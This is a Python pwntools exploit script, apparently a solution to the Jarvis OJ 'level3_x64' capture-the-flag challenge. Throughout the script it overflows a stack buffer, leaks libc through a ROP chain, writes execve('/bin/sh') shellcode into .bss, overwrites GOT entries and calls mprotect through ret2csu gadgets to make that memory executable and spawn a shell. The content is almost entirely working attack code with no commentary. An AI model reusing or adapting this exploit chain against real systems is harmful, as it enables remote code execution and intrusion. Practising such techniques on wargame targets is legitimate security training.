# -*- coding:utf-8 -*-
from pwn import*
context.log_level = "debug"
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p=remote('pwn2.jarvisoj.com',9884)
#p = process('level3_x64')
elf = ELF("./level3_x64")
libc = ELF("./libc-2.19.so")


log.info("*************************leak libc memory")
pause()
write_plt = elf.plt["write"]
write_got = elf.got["write"]
vul_add = elf.symbols["vulnerable_function"]
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

p1 = "1" * (0x80 + 8)
p1 += p64(rdi)
p1 += p64(1)
p1 += p64(rsi_r15)
p1 += p64(write_got)
p1 += "1" * 8
p1 += p64(write_plt)
p1 += p64(vul_add)
p.recv()
sleep(0.2)

p.send(p1)



data = p.recv(8)
read_addr = u64(data)

libc.base = read_addr - libc.symbols["write"]
mprotect_addr = libc.base + libc.symbols["mprotect"]
print "mprotect: ["+hex(mprotect_addr)+"]"
log.info("*************************write shellcode")
pause()

read_plt = elf.symbols['read']
bss_base = elf.bss()
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

payload2 = 'a'*0x80 + 'a'*8
payload2 += p64(rdi) + p64(0) 
payload2 += p64(rsi_r15)  + p64(bss_base) +"1"*8
payload2 += p64(read_plt)
payload2 += p64(vul_add)

sleep(0.2)
p.send(payload2)
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

sleep(0.2)
p.send(shellcode)
log.info("*************************write shellcode add")
pause()

bss_got= 0x0000000000600A48
payload3 = 'a'*0x80+'a'*8
payload3 += p64(rdi)+p64(0)
payload3 += p64(rsi_r15) + p64(bss_got) + "1"*8
payload3 += p64(read_plt) + p64(vul_add)

sleep(0.2)
p.send(payload3)
sleep(0.2)
p.send(p64(bss_base))

log.info("*************************write mprotect add")
pause()
mprotect_got = 0x0000000000600A50
payload4 = 'a'*0x80+'a'*8
payload4 += p64(rdi) + p64(0)
payload4 += p64(rsi_r15) + p64(mprotect_got) + p64(0)
payload4 += p64(read_plt) +p64(vul_add)

sleep(0.2)
p.send(payload4)
sleep(0.2)
p.send(p64(mprotect_addr))

log.info("*************************use mprotect and return execu shellcode")
pause()
gadget_start = 0x00000000004006A6
gadget_end = 0x0000000000400690

payload5 = 'a'*0x80+'a'*8
payload5 += p64(gadget_start) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)
payload5 +=p64(gadget_end) 
payload5 += 'a'*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)
payload5 += p64(gadget_end)

sleep(0.2)

gdb.attach(p)

p.send(payload5)

p.interactive()



